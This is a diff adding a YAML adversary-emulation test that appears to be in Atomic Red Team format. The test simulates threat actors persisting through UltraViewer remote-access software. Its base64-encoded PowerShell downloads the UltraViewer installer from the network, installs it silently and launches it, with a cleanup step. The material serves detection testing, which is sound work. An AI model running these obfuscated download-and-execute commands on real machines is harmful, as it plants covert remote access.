@@ -1,0 +1,19 @@
+- id: 790309c7-f2bc-5d78-a6b1-216754dde661
+  name: Soumaia ART Tests - UltraViewer - RAT Execution
+  description: A recent trend by threat actors, once a foothold is established, maintain long term persistence using third party remote services such as UltraViewer to provide the operator with access to the network using legitimate services. (requires elevation)
+  tactic: command-and-control
+  technique:
+    attack_id: T1219
+    name: Remote Access Software
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABUADEAMgAxADkAXwBVAGwAdAByAGEAVgBpAGUAdwBlAHIALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAcwA6AC8ALwB3AHcAdwAuAHUAbAB0AHIAYQB2AGkAZQB3AGUAcgAuAG4AZQB0AC8AZQBuAC8AVQBsAHQAcgBhAFYAaQBlAHcAZQByAF8AcwBlAHQAdQBwAF8ANgAuADUAXwBlAG4ALgBlAHgAZQAiACwAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAFQAMQAyADEAOQBfAFUAbAB0AHIAYQBWAGkAZQB3AGUAcgAuAGUAeABlACIAKQAKAA==
+          }
+          Start-Process -Wait -FilePath "$env:TEMP\ART-ExternalPayloads\T1219_UltraViewer.exe" -Argument "/silent" -PassThru
+          Start-Process 'C:\Program Files (x86)\UltraViewer\UltraViewer_Desktop.exe'
+        cleanup: |-
+          Stop-Process -Name "UltraViewer_Desktop" -Force -ErrorAction SilentlyContinue
